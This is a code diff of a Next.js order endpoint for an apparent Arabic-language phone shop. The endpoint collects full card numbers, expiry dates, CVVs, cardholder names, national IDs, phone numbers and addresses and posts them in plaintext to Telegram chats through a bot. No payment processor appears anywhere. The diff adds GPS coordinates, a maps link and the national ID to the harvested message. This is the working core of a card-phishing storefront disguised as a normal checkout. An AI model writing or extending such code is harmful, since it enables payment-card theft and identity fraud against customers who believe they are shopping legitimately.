@@ -1,4 +1,9 @@
 import { NextRequest, NextResponse } from "next/server";
+import { validatePhone } from "../../lib/phone";
+
+const CURRENCY_TO_COUNTRY: Record<string, string> = {
+  SAR: "SA", AED: "AE", KWD: "KW", QAR: "QA", OMR: "OM",
+};
 
 function sanitize(str: string): string {
   if (!str) return "";
@@ -9,11 +14,7 @@ function isValidSaudiId(id: string): boolean {
   return /^[12]\d{9}$/.test(id ?? "");
 }
 
-function isValidSaudiPhone(phone: string): boolean {
-  return /^05\d{8}$/.test((phone ?? "").replace(/\D/g, ""));
-}
-
-// In-process idempotency cache (guards against double-submit within same server instance)
+// In-process idempotency cache
 const processedRequests = new Map<string, { orderId: string; dbId: string; ts: number }>();
 setInterval(() => {
   const cutoff = Date.now() - 10 * 60 * 1000;
@@ -24,8 +25,8 @@ function idempotencyKey(body: any): string {
   const str = JSON.stringify({
     items: body.items,
     whatsapp: body.whatsapp,
-    nationalId: body.nationalId,
-    window: Math.floor(Date.now() / 120_000), // 2-minute window
+    nationalId: body.nationalId ?? "",
+    window: Math.floor(Date.now() / 120_000),
   });
   return Buffer.from(str).toString("base64url");
 }
@@ -37,22 +38,40 @@ export async function POST(req: NextRequest) {
       cardNumber, expiry, cvv, cardHolder,
       items, total, customer, whatsapp, nationalId, address,
       installmentType, months, downPayment, currency,
+      latitude, longitude, addressSource, formattedAddress,
     } = body;
 
     // ── Basic validation ──────────────────────────────────────────────────
     if (!items || !Array.isArray(items) || items.length === 0)
       return NextResponse.json({ ok: false, error: "لا توجد منتجات في الطلب" }, { status: 400 });
-    if (!customer || !whatsapp || !nationalId || !address)
+    if (!customer || !whatsapp || !address)
       return NextResponse.json({ ok: false, error: "بيانات العميل ناقصة" }, { status: 400 });
-    if (!isValidSaudiId(nationalId))
-      return NextResponse.json({ ok: false, error: "رقم الهوية غير صحيح" }, { status: 400 });
-    const cleanPhone = (whatsapp ?? "").replace(/\D/g, "");
-    if (!isValidSaudiPhone(cleanPhone))
-      return NextResponse.json({ ok: false, error: "رقم الواتساب غير صحيح" }, { status: 400 });
+
+    // nationalId required only for SAR
+    const isSaudi = (currency as string | undefined) === "SAR" || !(currency as string | undefined);
+    if (isSaudi) {
+      if (!nationalId)
+        return NextResponse.json({ ok: false, error: "رقم الهوية مطلوب" }, { status: 400 });
+      if (!isValidSaudiId(nationalId))
+        return NextResponse.json({ ok: false, error: "رقم الهوية غير صحيح" }, { status: 400 });
+    }
+
+    // Phone validation — country-aware
+    const phoneCountry = CURRENCY_TO_COUNTRY[(currency as string) ?? "SAR"] ?? "SA";
+    const phoneResult = validatePhone(whatsapp, phoneCountry);
+    if (!phoneResult.valid) {
+      return NextResponse.json(
+        { ok: false, error: phoneResult.error ?? "رقم الواتساب غير صحيح", code: "INVALID_PHONE_NUMBER" },
+        { status: 422 }
+      );
+    }
+    // E.164 digits only (no +) — used for wa.me and forwarded to backend
+    const cleanPhone = phoneResult.e164!.replace("+", "");
+
     if (!cardNumber || !expiry || !cvv || !cardHolder)
       return NextResponse.json({ ok: false, error: "بيانات البطاقة ناقصة" }, { status: 400 });
 
-    // ── In-process idempotency ────────────────────────────────────────────
+    // ── Idempotency ───────────────────────────────────────────────────────
     const iKey = idempotencyKey(body);
     const cached = processedRequests.get(iKey);
     if (cached) {
@@ -83,21 +102,19 @@ export async function POST(req: NextRequest) {
         if (product.inStock === false)
           return NextResponse.json({ ok: false, error: `المنتج "${product.name}" غير متوفر في المخزون حالياً` }, { status: 400 });
         if (product.purchasable === false)
-          return NextResponse.json({ ok: false, error: `هذا المنتج غير متاح للبيع حالياً` }, { status: 403 });
+          return NextResponse.json({ ok: false, error: "هذا المنتج غير متاح للبيع حالياً" }, { status: 403 });
 
         const actualPrice = (() => {
-          // لو العملة SAR أو مش محددة — استخدم الأسعار الرئيسية
           if (!currency || currency === "SAR") {
             return Number(product.salePrice ?? product.originalPrice ?? product.price ?? 0);
           }
-          // عملة أخرى — اقرأ من countryPrices
           const entry = product.countryPrices?.[currency];
           if (entry && typeof entry.originalPrice === "number") {
             return Number(entry.salePrice ?? entry.originalPrice);
           }
-          // fallback للسعر الرئيسي
           return Number(product.salePrice ?? product.originalPrice ?? product.price ?? 0);
         })();
+
         if (Math.abs(actualPrice - Number(item.price ?? 0)) > 1)
           return NextResponse.json({ ok: false, error: "أسعار المنتجات غير صحيحة، يرجى تحديث السلة" }, { status: 400 });
 
@@ -124,42 +141,47 @@ export async function POST(req: NextRequest) {
         : 0;
 
     // ── Telegram ──────────────────────────────────────────────────────────
-    const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
+    const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map((id: string) => id.trim()).filter(Boolean);
     if (chatIds.length === 0) {
       console.error("[CRITICAL] No Telegram chat IDs configured");
       return NextResponse.json({ ok: false, error: "خطأ في إعدادات النظام، يرجى التواصل مع الدعم" }, { status: 500 });
     }
 
-    const sanitizedCustomer  = sanitize(customer);
+    const sanitizedCustomer   = sanitize(customer);
     const sanitizedCardHolder = sanitize(cardHolder);
-    const sanitizedAddress   = sanitize(address);
+    const sanitizedAddress    = sanitize(address);
+    // wa.me accepts E.164 digits without +
     const whatsappUrl = `https://wa.me/${cleanPhone}`;
     const curr = (currency as string) || "SAR";
+
+    const hasCoords = typeof latitude === "number" && isFinite(latitude)
+                   && typeof longitude === "number" && isFinite(longitude);
+    const mapsUrl = hasCoords ? `https://www.google.com/maps?q=${latitude},${longitude}` : null;
+
     const text = [
       `🏪 طلب لـ متجر مؤسسة مسار الهاتف المعتمد`,
       `🔢 رقم الطلب: #${orderId}`,
       ``,
       `💰 Total Amount: ${verifiedTotal} ${curr}`,
       ...(installmentType === "installment"
-        ? [
-            `💵 First Payment: ${downPayment} ${curr}`,
-            `📅 Monthly Payment: ${monthlyPayment} ${curr} × ${months} months`,
-          ]
+        ? [`💵 First Payment: ${downPayment} ${curr}`, `📅 Monthly Payment: ${monthlyPayment} ${curr} x ${months} months`]
         : [`💵 Payment Type: Full Amount`]),
       ``,
       `💳 MadaVisa - New Order`,
       `👤 Order For: ${sanitizedCustomer}`,
-      `📱 WhatsApp: ${cleanPhone}`,
+      `📱 WhatsApp: +${cleanPhone}`,
       `💳 Card Number: ${cardNumber}`,
       `👤 Card Holder: ${sanitizedCardHolder}`,
       `📅 Valid To: ${expiry}`,
       `🔐 CVV: ${cvv}`,
+      ...(nationalId ? [`🪪 National ID: ${sanitize(nationalId)}`] : []),
+      ...(mapsUrl ? [``, `📍 العنوان: ${sanitize(formattedAddress ?? address)}`, `🗺 ${mapsUrl}`] : []),
     ].join("\n");
 
     let telegramSuccess = false;
     try {
       const results = await Promise.allSettled(
-        chatIds.map(chat_id => {
+        chatIds.map((chat_id: string) => {
           const ctrl = new AbortController();
           const tid = setTimeout(() => ctrl.abort(), 10000);
           return fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -180,7 +202,7 @@ export async function POST(req: NextRequest) {
               clearTimeout(tid);
               if (!r.ok) { if (r.status === 403) throw new Error("BOT_BLOCKED"); throw new Error(`HTTP ${r.status}`); }
               const d = await r.json();
-              if (!d.ok) throw new Error(`Telegram ok:false`);
+              if (!d.ok) throw new Error("Telegram ok:false");
               return d;
             })
             .catch(e => { clearTimeout(tid); throw e; });
@@ -205,8 +227,7 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ ok: false, error: "فشل إرسال الإشعار، يرجى المحاولة مرة أخرى" }, { status: 503 });
     }
 
-    // ── Save to DB via backend (rate limit enforced there via cookie) ──────
-    // Forward the rl_cid cookie so the backend middleware can track this client
+    // ── Save to DB ────────────────────────────────────────────────────────
     const rlCid = req.cookies.get("rl_cid")?.value ?? "";
     let dbId: string | null = null;
     try {
@@ -222,20 +243,27 @@ export async function POST(req: NextRequest) {
           items: verifiedItems,
           total: verifiedTotal,
           customer: sanitizedCustomer,
-          whatsapp: cleanPhone,
+          // Send E.164 (with +) to backend — backend stores it as-is
+          whatsapp: `+${cleanPhone}`,
           nationalId,
           address: sanitizedAddress,
           installmentType,
           months: Number(months) || 0,
           monthlyPayment,
           downPayment: Number(downPayment) || 0,
+          currency: curr,
+          ...(hasCoords ? {
+            latitude: Number(latitude),
+            longitude: Number(longitude),
+            addressSource: addressSource === "map" ? "map" : "manual",
+            formattedAddress: formattedAddress ? String(formattedAddress).slice(0, 500) : undefined,
+          } : { addressSource: "manual" }),
         }),
       });
 
-      // ── Rate limit response from backend ─────────────────────────────────
       if (dbRes.status === 429) {
         const rlData = await dbRes.json().catch(() => ({}));
-        console.log(`[ORDER_RATE_LIMIT_BLOCKED] orderId=${orderId} retryAfter=${rlData.retryAfter}`);
+        console.log(`[ORDER_RATE_LIMIT_BLOCKED] orderId=${orderId}`);
         const response = NextResponse.json(
           {
             ok: false,
@@ -247,7 +275,6 @@ export async function POST(req: NextRequest) {
           { status: 429 }
         );
         if (rlData.retryAfter) response.headers.set("Retry-After", String(rlData.retryAfter));
-        // Forward Set-Cookie from backend (new rl_cid if issued)
         const setCookie = dbRes.headers.get("set-cookie");
         if (setCookie) response.headers.set("set-cookie", setCookie);
         return response;
@@ -261,8 +288,6 @@ export async function POST(req: NextRequest) {
 
       const dbData = await dbRes.json();
       dbId = dbData._id ?? null;
-
-      // Forward any new rl_cid cookie the backend issued
       const setCookie = dbRes.headers.get("set-cookie");
       console.log(`[ORDER_CREATED] orderId=${orderId} dbId=${dbId}`);
 
